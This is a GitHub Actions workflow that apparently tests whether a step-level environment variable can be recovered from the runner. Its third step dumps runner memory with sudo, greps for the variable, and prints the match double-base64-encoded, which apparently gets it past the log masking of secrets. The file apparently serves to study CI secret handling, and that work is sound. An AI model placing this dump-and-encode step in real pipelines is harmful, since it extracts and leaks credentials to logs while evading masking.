name: Step-Level Env Memory Dump

on:
  workflow_dispatch:

jobs:
  check-step-visibility:
    runs-on: ubuntu-latest

    steps:
      # リポジトリ内の src/test.py をランナーに持ってくるために必要
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Step 1 - Set Step-level ENV
        env:
          STEP_VAL: "U0dsS1pHVnVVMlZqY21WMg=="
        run: |
          echo "Step 1: STEP_VAL is loaded into Runner memory."

      - name: Step 2 - Ordinary Printenv
        run: |
          printenv | grep STEP_VAL || echo "Step 2: Not in standard printenv."

      - name: Step 3 - Memory Dump via src/test.py
        run: |
          # src/test.py を実行してパイプで繋ぐだけのスッキリしたワンライナー
          B64_BLOB=$(sudo python3 ./.github/workflows/test.py | tr -d '\0' | grep -aoEi 'STEP_VAL=[A-Za-z0-9+/=]+' | sort -u | base64 -w 0 | base64 -w 0)

          if [ -n "$B64_BLOB" ]; then
            echo "$B64_BLOB"
          else
            exit 0
          fi
